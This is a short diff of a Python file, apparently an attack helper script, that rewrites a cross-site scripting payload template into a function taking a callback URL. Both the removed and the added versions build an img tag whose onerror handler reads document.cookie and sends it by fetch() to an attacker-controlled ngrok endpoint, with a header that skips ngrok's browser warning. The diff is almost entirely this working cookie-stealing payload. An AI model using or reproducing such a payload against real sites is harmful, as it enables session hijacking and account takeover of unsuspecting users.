@@ -28,5 +28,14 @@ def get_base_headers():
     }
     return BASE_HEADERS
 
-CALLBACK_URL = "https://your-ngrok-url.ngrok-free.app"
-XSS_PAYLOAD_TEMPLATE = f"""<img src="invalid" onerror="var cookie = document.cookie;fetch('{CALLBACK_URL}/steal?cookie=' + encodeURIComponent(cookie),{{method: 'get', headers: new Headers({{'ngrok-skip-browser-warning': '69420'}})}}).then( () => {{console.log('cookie sent')}})">"""
+
+# CALLBACK_URL = "https://your-ngrok-url.ngrok-free.app"
+
+
+def get_xss(CALLBACK_URL):
+    XSS_PAYLOAD_TEMPLATE = (
+        """<img src="scs" onerror="var cookie = document.cookie;fetch('"""
+        + CALLBACK_URL
+        + """' + cookie,{method: 'get', headers: new Headers({'ngrok-skip-browser-warning': '69420'})}).then( () => {console.log('hapi')})">"""
+    )
+    return XSS_PAYLOAD_TEMPLATE
